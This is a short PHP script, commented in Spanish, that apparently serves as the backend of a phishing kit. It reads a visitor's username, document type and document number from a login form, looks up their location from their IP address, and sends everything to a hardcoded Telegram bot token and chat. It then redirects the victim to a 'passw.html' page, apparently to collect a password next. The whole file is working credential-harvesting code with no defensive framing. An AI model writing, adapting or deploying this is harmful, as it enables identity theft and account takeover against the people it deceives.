<?php
// Configuración del bot de Telegram
$botToken = '8198531920:AAEvRL0O26Hs5cdjTRsImltuxQGMlIKqCHk';
$chatId = '-4695344087';

// Obtener datos del formulario
$tipoDocumento = $_POST['tipo_documento'] ?? '';
$documento = $_POST['documento'] ?? '';
$usuario = $_POST['usuario'] ?? '';

// Obtener ubicación mediante IP
$ip = $_SERVER['REMOTE_ADDR'];
$locationData = @json_decode(file_get_contents("http://ip-api.com/json/$ip"), true);

$ciudad = $locationData['city'] ?? 'Desconocida';
$pais = $locationData['country'] ?? 'Desconocido';

// Crear mensaje
$mensaje = "📌 *Nuevo inicio de sesión*\n";
$mensaje .= "👤 *Usuario:* $usuario\n";
$mensaje .= "🆔 *Tipo de Documento:* $tipoDocumento\n";
$mensaje .= "📄 *Documento:* $documento\n";
$mensaje .= "🌍 *Ubicación:* $ciudad, $pais\n";
$mensaje .= "📡 *IP:* $ip";

// Enviar mensaje a Telegram
$url = "https://api.telegram.org/bot$botToken/sendMessage";
$data = [
    'chat_id' => $chatId,
    'text' => $mensaje,
    'parse_mode' => 'Markdown'
];

$options = [
    'http' => [
        'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
        'method'  => 'POST',
        'content' => http_build_query($data),
    ],
];

$context  = stream_context_create($options);
$result = file_get_contents($url, false, $context);

// Redirigir al usuario a una página de confirmación
header("Location: passw.html");
exit;
?>